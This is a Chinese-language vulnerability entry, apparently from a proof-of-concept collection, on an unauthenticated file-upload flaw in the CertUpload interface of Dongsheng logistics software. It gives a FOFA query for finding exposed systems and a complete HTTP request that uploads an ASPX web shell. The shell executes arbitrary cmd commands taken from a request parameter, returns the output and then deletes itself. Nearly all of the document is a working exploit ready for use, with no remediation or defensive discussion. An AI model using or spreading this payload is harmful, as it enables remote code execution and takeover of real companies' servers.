# 东胜物流软件CertUpload文件上传漏洞

东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。由于东胜物流软件  CertUpload 接口处未对用户上传的文件进行合理的判断和过滤，导致存在文件上传漏洞，未经身份验证远程攻击者可利用该漏洞上传任意脚本文件，执行恶意代码，写入WebShell,进一步控制服务器权限。

## fofa

```javascript
body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
```

## poc

```javascript
POST /MsWlTruck/CertUpload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown

------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: image/jpeg

<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="TruckNo";

1
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="Cert_Type";

1
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
```

![image-20241122152041797](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411221520864.png)